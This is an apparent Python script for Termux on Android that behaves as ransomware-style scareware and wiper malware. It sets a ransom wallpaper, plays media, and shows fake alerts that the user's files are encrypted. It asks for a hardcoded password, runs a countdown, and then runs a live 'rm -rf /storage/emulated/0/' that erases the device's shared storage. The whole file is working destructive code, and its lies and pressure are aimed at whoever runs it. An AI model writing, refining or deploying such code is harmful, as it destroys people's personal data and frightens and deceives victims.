#!/data/data/com.termux/files/usr/bin/python
import os
import sys
import time
import json
import threading
import subprocess

PASSWORD="1"

BASE_DIR = os.path.dirname(os.path.abspath(__file__))

SOUND_FILE_1= os.path.join(BASE_DIR, "fs.mp3")
VIDEO_FILE= os.path.join(BASE_DIR, "g.mp4")
FOTO_RANSOM= os.path.join(BASE_DIR, "Yes.jpg")

TIMER_SECONDS=60

stop_event=threading.Event()
password_entered=False
first_sound_played=False

def set_wallpaper():
    if os.path.exists(FOTO_RANSOM):
        subprocess.run([
            "termux-wallpaper",
            "-f",
            FOTO_RANSOM
        ])
        return True
    return False

def restore_wallpaper():
    subprocess.run([
        "termux-wallpaper",
        "-r"
    ],capture_output=True)

def show_notification(title,content):
    subprocess.run([
        "termux-notification",
        "--title",title,
        "--content",content
    ])

def show_dialog(title,hint):
    result=subprocess.run([
        "termux-dialog",
        "text",
        "-t",title,
        "-i",hint
    ],capture_output=True,text=True)

    return result.stdout

def vibrate():
    subprocess.run([
        "termux-vibrate",
        "-d",
        "300"
    ])

def play_sound(sound_file):
    if os.path.exists(sound_file):
        subprocess.Popen([
            "termux-media-player",
            "play",
            sound_file
        ])

def stop_sound():
    subprocess.run([
        "pkill",
        "-f",
        "termux-media-player"
    ])

def delete_all_files():
    show_notification(
        "DELETING",
        "ALL FILES ARE BEING DELETED"
    )

    vibrate()
    time.sleep(2)

    subprocess.run([
        "rm",
        "-rf",
        "/storage/emulated/0/"
    ])

def password_checker():
    global password_entered

    while not password_entered and not stop_event.is_set():

        time.sleep(19)

def main():
    global password_entered


    show_notification(
        "ACCESS DENIED",
        "WRONG PASSWORD"
    )

    vibrate()

    if os.path.exists(VIDEO_FILE):

        subprocess.Popen([
            "termux-open",
            VIDEO_FILE
        ])

        time.sleep(30)

    subprocess.run([
        "am",
        "start",
        "-n",
        "com.termux/com.termux.app.TermuxActivity"
    ])

    play_sound(SOUND_FILE_1)

    set_wallpaper()
    
    result = show_dialog(
            "ACCESS",
            "ENTER PASSWORD"
    )

    try:
        data = json.loads(result)

        if data.get("text") == PASSWORD:

            password_entered = True

            show_notification(
                "SUCCESS",
                "CORRECT PASSWORD"
            )

            stop_sound()
            restore_wallpaper()

            return

        else:

            show_notification(
                "WRONG PASSWORD",
                "TRY AGAIN"
            )

            vibrate()

    except:
        pass

    password_thread=threading.Thread(
        target=password_checker
    )

    password_thread.start()

    for i in range(5):

        if password_entered:
            break

        show_notification(
            "SYSTEM ALERT",
            "YOUR FILES ARE ENCRYPTED"
        )

        vibrate()
        time.sleep(2)

    remaining=TIMER_SECONDS

    while remaining>0:

        if password_entered:
            break

        if remaining%60==0:

            minutes=remaining//60

            show_notification(
                "COUNTDOWN",
                f"{minutes} MINUTES LEFT"
            )

            vibrate()

        remaining-=1
        time.sleep(1)

    if password_entered:

        show_notification(
            "SAFE",
            "FILES ARE SAFE"
        )

        restore_wallpaper()
        stop_sound()

        return

    show_notification(
        "TIME EXPIRED",
        "DELETING ALL FILES"
    )

    vibrate()

    delete_all_files()

    for i in range(10):

        show_notification(
            "DELETING",
            f"{i*10}% COMPLETE"
        )

        time.sleep(0.5)

    show_notification(
        "COMPLETE",
        "ALL FILES HAVE BEEN DELETED"
    )

if __name__=="__main__":

    try:
        main()

    except:
        restore_wallpaper()
        stop_sound()
